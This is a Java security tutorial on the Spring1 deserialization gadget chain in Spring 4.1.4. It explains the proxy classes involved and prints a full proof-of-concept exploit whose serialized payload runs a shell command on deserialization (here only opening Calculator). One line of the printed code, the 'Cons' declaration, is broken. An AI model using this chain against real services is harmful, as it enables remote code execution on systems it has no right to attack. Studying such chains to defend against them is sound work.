# Java Security Learning—Spring1 Chain

Author: H3rmesk1t

Data: 2022.03.12

# Environment configuration
Configure the `pom.xml` file and add the following dependencies:

```xml
<dependencies>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>4.1.4.RELEASE</version>
    </dependency>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-beans</artifactId>
        <version>4.1.4.RELEASE</version>
    </dependency>
</dependencies>
```

# Pre-knowledge
## MethodInvokeTypeProvider
There is an internal class `org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider` in the `Spring` core package, which implements the `TypeProvider` interface, which is a class that can be deserialized.

Take a look at the `readObject method`, and call `ReflectionUtils` first `findMethod` returns the `Method` object and then immediately calls the `invokeMethod` reflection call. It should be noted that the call here is a call without arguments. Since `findMethod` is searched in `this.provider.getType().getClass()`, if you change the `methodName` to `newTransformer` method, and then find a way to process `this.provider.getType()` into `TemplatesImpl`, you can use `TemplatesImpl` to trigger the vulnerability.

<div align=center><img src="./images/1.png"></div>

## ObjectFactoryDelegatingInvocationHandler
`org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler` is an implementation class of `InvocationHandler`. When instantiating, it receives an `ObjectFactory` object and calls the `getObject` method of `ObjectFactory` when invoke` proxy. Returns an instance of `ObjectFactory` for reflective call of `Method`.

Since the object returned by the `getObject` method of `ObjectFactory` is generic, you can use `AnnotationInvocationHandler` to proxy and return any object. `ObjectFactoryDelegatingInvocationHandler` itself is a proxy class, and you can use it to proxy the `getType` method of the previous `TypeProvider`.

<div align=center><img src="./images/2.png"></div>

# EXP
```java
package org.h3rmesk1t.Spring1;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 3:47 pm
 */
public class Spring1Exploit {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static Object templatesImpl
() throws Exception {

        // Generate malicious bytecodes
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");";
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("Spring1Exploit");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(cmd);
        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        // Instantiate the class and set properties
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_name", "h3rmesk1t");
        setFieldValue(templatesImpl, "_bytecodes", targetByteCodes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        return templatesImpl;
    }

    public static void main(String[] args) throws Exception {

        // Use AnnotationInvocationHandler to dynamic proxy
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        HashMap<String, Object> map = new HashMap<>();
        map.put("getObject", templatesImpl());

        // Initialize AnnotationInvocationHandler with dynamic proxy
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);

        // Use the getObject method of the AnnotationInvocationHandler to dynamically proxy the ObjectFactory to return TemplatesImpl
        ObjectFactory<?> factory = (ObjectFactory<?>) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{ObjectFactory.class}, invocationHandler);

        // The invoke method of ObjectFactoryDelegatingInvocationHandler triggers the getObject of ObjectFactory
        // And method.invoke(return value, args) will be called
        // At this time, the return value is changed to TemplatesImpl by us using dynamic proxy.
        // Next, the method needs to be newTransformer() to trigger the call chain
        Class<?> bClass = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        Constructor<?> ofdConstructor = bClass.getDeclaredConstructors()[0];
        ofdConstructor.setAccessible(true);

        // Instantiate the ObjectFactory class with dynamic proxying ObjectFactoryDelegatingInvocationHandler
        InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factory);

        // ObjectFactoryDelegatingInvocationHandler itself is an InvocationHandler
        // Use it to proxy a class, so that the invoke method of ObjectFactoryDelegatingInvocationHandler will be triggered when this class is called.
        // We use it to proxy a class that is both Type and Templates(TemplatesImpl parent class)
        // In this way, this proxy class has two methods at the same time, which can be forced to be converted into the return value of TypeProvider.getType(), and can also find the newTransformer method in it.
        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{Type.class, Templates.class}, ofdHandler);

        // Next, proxie the getType() method of TypeProvider, making it return the typeTemplateProxy proxy class we created
        HashMap<String, Object> map2 = new HashMap<>();
        map2.put("getType", typeTemplateProxy);
        InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);

        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        // Use the getType method of the AnnotationInvocationHandler to dynamically proxy the TypeProvider to return typeTemplateProxy
        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{typeProviderClass}, newInvocationHandler);


        // Initialize MethodInvokeTypeProvider
        Class<?> clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Cons = clazz2.getDeclaredConstructors()[0];
        cons.setAccessible(true);

        // Since the ReflectionUtils.invokeMethod(method, provider.getType()) will be called immediately when the MethodInvokeTypeProvider is initialized
// So when initializing, we can just give a Method, methodName we use reflection to write it in.
        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
        Field field = clazz2.getDeclaredField("methodName");
        field.setAccessible(true);
        field.set(objects, "newTransformer");

        // Generate exp
        String exp = serialize(objects);
        System.out.println(exp);
        // Trigger exp
        unserialize(exp);
    }
}
```

<div align=center><img src="./images/3.png"></div>

# Call chain

```java
SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()
    SerializableTypeWrapper.TypeProvider(Proxy).getType()
	    AnnotationInvocationHandler.invoke()
		    ReflectionUtils.invokeMethod()
			    Templates(Proxy).newTransformer()
				    AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()
					    ObjectFactory(Proxy).getObject()
						    TemplatesImpl.newTransformer()
```

# Summarize
## Usage Instructions
Multiple dynamic proxying uses the reflection calling mechanism of dynamic proxy to extend the call chain. The chain of `Spring1` is somewhat similar to `Groovy`.

## Gadget
 - kick-off gadget: org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider#readObject
 - sink gadget: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer
 - chain gadget: org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler#invoke